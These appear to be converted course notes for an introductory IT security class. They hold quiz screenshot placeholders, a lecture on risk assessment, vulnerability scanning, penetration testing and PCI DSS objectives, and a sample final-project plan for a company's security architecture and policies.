
![Graphical user interface, text, application, email Description
automatically generated](media/image855.png){width="6.5in"
height="3.9381944444444446in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image856.png){width="6.5in"
height="4.654861111111111in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image857.png){width="6.5in"
height="3.952777777777778in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image858.png){width="6.5in"
height="4.065277777777778in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image859.png){width="6.5in"
height="4.041666666666667in"}

![Graphical user interface, text, application Description automatically
generated](media/image860.png){width="6.5in"
height="4.466666666666667in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image861.png){width="6.5in"
height="3.3604166666666666in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image862.png){width="6.5in"
height="3.464583333333333in"}

![Graphical user interface, text, application, email, Teams Description
automatically generated](media/image863.png){width="6.5in"
height="3.089583333333333in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image864.png){width="6.5in"
height="3.4659722222222222in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image865.png){width="6.5in"
height="3.45625in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image866.png){width="6.5in"
height="4.2659722222222225in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image867.png){width="6.5in"
height="3.314583333333333in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image868.png){width="6.5in"
height="3.5854166666666667in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image869.png){width="6.5in"
height="3.4965277777777777in"}

## Quiz questions II

![Graphical user interface, application, Teams Description automatically
generated](media/image870.png){width="6.5in"
height="5.997222222222222in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image871.png){width="6.5in"
height="3.5104166666666665in"}

![Graphical user interface, text, application Description automatically
generated](media/image872.png){width="6.5in"
height="6.715277777777778in"}

![Graphical user interface, text, application, Teams Description
automatically generated](media/image873.png){width="6.5in"
height="4.616666666666666in"}

![Graphical user interface, text, application Description automatically
generated](media/image874.png){width="6.5in" height="4.41875in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image875.png){width="6.5in"
height="3.4930555555555554in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image876.png){width="6.5in"
height="4.152083333333334in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image877.png){width="6.5in"
height="3.942361111111111in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image878.png){width="6.5in"
height="3.408333333333333in"}

![Text Description automatically generated with medium
confidence](media/image879.png){width="6.5in"
height="2.298611111111111in"}

## Case sample: Creating a Company Culture for Security

### Measuring and assessing risk

We\'ve covered Security Risk Assessment a little bit in the last lesson.
But there\'s lots more to talk about. Security is all about determining
risks or exposure understanding the likelihood of attacks; and designing
defenses around these risks to minimize the impact of an attack. This
thought process is actually something that everyone uses in their daily
life, whether they know it or not. Think of when you cross a busy
intersection, you assess the probability of being hit by an oncoming car
and the minimize that risk by choosing the right time to cross the road.
Security risk assessment starts with threat modeling. First, we identify
likely threats to our systems, then we assign them priorities that
correspond to severity and probability. We do this by brainstorming from
the perspective of an outside attacker putting ourselves in a hackers
shoes. It helps to start by figuring out what high value targets an
attacker may want to go after. From there, you can start to look at
possible attack vectors that could be used to gain access to high value
assets. High-value data usually includes account information, like
usernames and passwords. Typically, any kind of user data is considered
high value, especially if payment processing is involved. Another part
of risk measurement is understanding what vulnerabilities are on your
systems and network. One way to find these out is to perform regular
vulnerabilities scanning. There are lots of open source and commercial
solutions that you can use. They can be configured to perform scheduled,
automated scans of designated systems or networks to look for
vulnerabilities. Then they generate a report. Some of these tools are
Nessus, OpenVas and Qualys which I\'ve linked to in the next reading.
Let me break down what vulnerability scanners do. Heads up, this might
be a little dense, so feel free to go over it again. Vulnerability
scanners are services that run on your system within your control that
conduct periodic scans of configure networks. The service then conducts
scans to find and discover hosts on the network. Once hosts are found
either through a ping sweep or port scanning more detailed scans are run
against discovered hosts scans, upon scans, upon scans. A port scan of
either common ports or all possible valid ports is conducted against
discovered hosts to determine what services are listening. These
services are then probed to try to discover more info about the type of
service and what version is listening on the relevant port. This
information can then be checked against databases of known
vulnerabilities. If a vulnerable version of a service is discovered, the
scanner will add it to its report. Once the scan is finished the
discovered vulnerabilities and hosts are compiled in a report, that way
and analysts can quickly and easily see where the problem areas are on
the network. Found vulnerabilities are prioritized according to
severity, and other categorization. Severity takes into account a number
of things, like how likely the vulnerability is to be exploited. It also
considers the type of access the vulnerability would provide to an
attacker and whether or not it can be exploited remotely or not.
Vulnerabilities and the report will have links to detailed and disclosed
information about the vulnerability. In some cases, it will also have
recommendations on how to get rid of it. Vulnerability scanners will
detect lots of things, ranging from misconfigured services that
represent potential risks, to detecting the presence of back doors and
systems. It\'s important to call out that vulnerability scanning can
only detect known and disclose vulnerabilities and insecure
configurations. That\'s why it\'s important for you to have an automated
vulnerability scan conducted regularly. You\'ll also need to keep the
vulnerability database up to date, to make sure new vulnerabilities are
detected quickly. But vulnerability scanning isn\'t the only way to put
your defenses to the test. Conducting regular penetration tests is also
really encouraged to test your defenses even more. These tests will also
ensure detection and alerting systems are working properly. Penetration
Testing is the practice of attempting to break into a system or network
to verify the systems in place. Think of this as playing the role of a
bad guy, for educational purposes. This exercise isn\'t designed to see
if you have the acting chops it\'s intended to make you think like an
attacker and use the same tools and techniques they would use. This way,
you can test your systems to make sure they protect you like they\'re
supposed to. The results of the penetration testing reports will also
show you, where weak points or blind spots exist. These tests help
improve defenses and guide future security projects. They can be
conducted by members of your in-house security team. If your internal
team doesn\'t have the resources for this exercise you can hire a third
party company that offers penetration testing as a service. You can even
do both. That would help give you more perspectives on your defense
systems and you\'ll get a more comprehensive test this way.

### Security Goals

Congratulations. You\'ve reached the last chunk of the last course of
this program. You are totally ready to lock down every single operation
of your organization and make it airtight. Right? Not quite. If you\'re
responsible for an organization of users, there\'s a delicate balance
between security and user productivity. We\'ve seen this balance in
action when we dove into the different security tools and systems
together. Before you start to design a security architecture, you need
to define exactly what you like it to accomplish. This will depend on
what your company thinks is most important. It will probably have a way
it wants different data to be handled and stored. You also need to know
if your company has any legal requirements when it comes to security. If
your company handles credit card payments, then you have to follow the
PCI DSS or Payment Card Industry Data Security Standard depending on
local laws. We\'ll take a closer look at PCI DSS which is a great
example of clearly defined security goals. PCI DSS is broken into six
broad objectives, each with some requirements. The first objective is to
build and maintain a secure network and systems. This includes the
requirements to install and maintain a firewall configuration to protect
cardholder data and to not use vendor supply default for system
passwords and other security parameters. As you can tell, the
requirements are related to the objective. The objective is the end goal
or what we\'d like to achieve and the requirements are the actions that
can help achieve that goal. PCI DSS goes into more detailed actions for
each requirement. It provides more specific guidance around what a
firewall configuration should control. For example, a secure firewall
configuration should restrict connections between untrusted networks and
any systems in the cardholder data environment. That\'s a little
generic, but it does give us some guidance on how to meet the
requirements. The second objective category is to protect cardholder
data. In this objective, the first requirement is to protect stored
cardholder data. The second is to encrypt the transmission of cardholder
data across open public networks. I want to call out again how the broad
objective is to protect sensitive data that\'s stored in systems within
our control. The requirements give us specific guidelines on how to get
this done. The specifics of these requirements help clarify some of the
points like what constitutes an open network. They also recommend using
strong cryptography and offer some examples. But not all requirements
are technical in nature. Let\'s look at the requirement to protect
stored cardholder data for example, it has requirements for data
retention policies to make sure that sensitive payment information
isn\'t stored beyond the time it\'s required. Once payment is
authorized, authentication data shouldn\'t be needed anymore and it
should be securely deleted. This highlights the fact that good security
defenses aren\'t just technical in nature. They are also procedural and
policy-based. The third objective is to maintain a vulnerability
management program. The first requirement is to protect all systems
against malware and regularly update antivirus software or programs. The
second is to develop and maintain secure systems and applications.
You\'ll find more detailed implementation procedures within these
requirements. They\'ll cover things like ensuring all systems have
antivirus software installed and making sure this software is kept up to
date. They also require that scans are run regularly and logs are
maintained. There are also requirements for ensuring systems and
software are protected against known vulnerabilities by applying
security patches at least one month from the release of a security
patch. Use of third-party security vulnerability databases is also
listed to help identify known vulnerabilities within managed systems.
The fourth objective is to implement strong access control measures.
This objective has three requirements. The first is to restrict access
to cardholder data by business need-to-know. The second is to identify
and authenticate access to system components. And the third is to
restrict physical access to cardholder data. This highlights the
importance of good access control measures along with good data access
policies. The first objective, restricting access to data by business
need-to-know, means that any sensitive data should be directed to data
access policies to make sure that customer data isn\'t misused. Part of
this requirement is to enforce password authentication for system access
and two factor authentication for remote access, that\'s the minimum
requirement. Another important piece highlighted by the PCI DSS
requirements is access control for physical access. This is a critical
security aspect to keep in mind since we need to protect systems and
data from both physical theft and virtual attacks. The fifth objective
is to regularly monitor and test networks. The first requirement is to
track and monitor all access to network resources and cardholder data.
The second is to regularly test security systems and processes. The
requirement for network monitoring and testing is another essential part
of a good security plan. This refers to things like setting up and
configuring intrusion detection systems and conducting vulnerability
scans of the network which will cover a bit more later. Testing defenses
is another super important part of this. Just having the systems in
place isn\'t enough. It\'s really helpful to test defense systems
regularly to make sure that they provide the protection that you want.
It also ensures that the alerting systems are functional. But don\'t
worry, we\'ll dive deeper into this a little bit later when we cover
penetration testing. The sixth and final objective is to maintain an
information security policy. It only has one requirement, to maintain a
policy that addresses information security for all personnel. This
requirement addresses why we need to have well-established security
policies. They help govern and regulate user behavior when it comes to
information security aspects. It\'s important to call out that this
requirement mentions that the policy should be for all personnel. The
responsibility of information security isn\'t only on the security
teams. Every member of an organization is responsible for information
security. Well-designed security policies address the most common
questions or use cases that users would have based on the specific
details of the organization. Every one that uses systems on your
organization\'s network, is able to get around security. They might not
mean to, but they can reduce the overall security with their actions and
practices. That\'s why having well-thought-out security policies in
place also need to be easy to find, and easy to read. We\'ll cover more
details about user education and getting users involved in the overall
security plan in another upcoming video of this course.

### **Final Project - Sample Submission**

#### Authentication

Authentication will be handled centrally by an LDAP server and will
incorporate One-Time Password generators as a 2nd factor for
authentication.

#### External Website

The customer-facing website will be served via HTTPS, since it will be
serving an e-commerce site permitting visitors to browse and purchase
products, as well as create and log into accounts. This website would be
publically accessible.

#### Internal Website

The internal employee website will also be served over HTTPS, as it will
require authentication for employees to access. It will also only be
accessible from the internal company network and only with an
authenticated account.

#### Remote Access

Since engineers require remote access to internal websites, as well as
remote command line access to workstations, a network-level VPN solution
will be needed, like OpenVPN. To make internal website access easier, a
reverse proxy is recommended, in addition to VPN. Both of these would
rely on the LDAP server that was previously mentioned for authentication
and authorization.

#### Firewall

A network-based firewall appliance would be required. It would include
rules to permit traffic for various services, starting with an implicit
deny rule, then selectively opening ports. Rules will also be needed to
allow public access to the external website, and to permit traffic to
the reverse proxy server and the VPN server.

#### Wireless

For wireless security, 802.1X with EAP-TLS should be used. This would
require the use of client certificates, which can also be used to
authenticate other services, like VPN, reverse proxy, and internal
website authentication. 802.1X is more secure and more easily managed as
the company grows, making it a better choice than WPA2.

#### VLANs

Incorporating VLANs into the network structure is recommended as a form
of network segmentation; it will make controlling access to various
services easier to manage. VLANs can be created for broad roles or
functions for devices and services. An engineering VLAN can be used to
place all engineering workstations and engineering services on. An
Infrastructure VLAN can be used for all infrastructure devices, like
wireless APs, network devices, and critical servers like authentication.
A Sales VLAN can be used for non-engineering machines, and a Guest VLAN
would be useful for other devices that don\'t fit the other VLAN
assignments.

#### Laptop Security

As the company handles payment information and user data, privacy is a
big concern. Laptops should have full disk encryption (FDE) as a
requirement, to protect against unauthorized data access if a device is
lost or stolen. Antivirus software is also strongly advised to avoid
infections from common malware. To protect against more uncommon attacks
and unknown threats, binary whitelisting software is recommended, in
addition to antivirus software.

#### Application Policy

To further enhance the security of client machines, an application
policy should be in place to restrict the installation of third-party
software to only applications that are related to work functions.
Specifically, risky and legally questionable application categories
should be explicitly banned. This would include things like pirated
software, license key generators, and cracked software.

In addition to policies that restrict some forms of software, a policy
should also be included to require the timely installation of software
patches. "Timely" in this case will be defined as 30 days from the wide
availability of the patch.

#### User Data Privacy Policy

As the company takes user privacy very seriously, some strong policies
around accessing user data are a critical requirement. User data must
only be accessed for specific work purposes, related to a particular
task or project. Requests must be made for specific pieces of data,
rather than overly broad, exploratory requests. Requests must be
reviewed and approved before access is granted. Only after review and
approval will an individual be granted access to the specific user data
requested. Access requests to user data should also have an end date.

In addition to accessing user data, policies regarding the handling and
storage of user data are also important to have defined. These will help
prevent user data from being lost and falling into the wrong hands. User
data should not be permitted on portable storage devices, like USB keys
or external hard drives. If an exception is necessary, an encrypted
portable hard drive should be used to transport user data. User data at
rest should always be contained on encrypted media to protect it from
unauthorized access.

#### Security Policy

To ensure that strong and secure passwords are used, the password policy
below should be enforced:

-   Password must have a minimum length of 8 characters

-   Password must include a minimum of one special character or
    > punctuation

-   Password must be changed once every 12 months

In addition to these password requirements, a mandatory security
training must be completed by every employee once every year. This
should cover common security-related scenarios, like how to avoid
falling victim to phishing attacks, good practices for keeping your
laptop safe, and new threats that have emerged since the last time the
course was taken.

#### Intrusion Detection or Prevention Systems

A Network Intrusion Detection System is recommended to watch network
activity for signs of an attack or malware infection. This would allow
for good monitoring capabilities without inconveniencing users of the
network. A Network Intrusion Prevention System (NIPS) is recommended for
the network where the servers containing user data are located; it
contains much more valuable data, which is more likely to be targeted in
an attack. In addition to Network Intrusion Prevention, Host-based
Intrusion Detection (HIDS) software is also recommended to be installed
on these servers to enhance monitoring of these important systems.
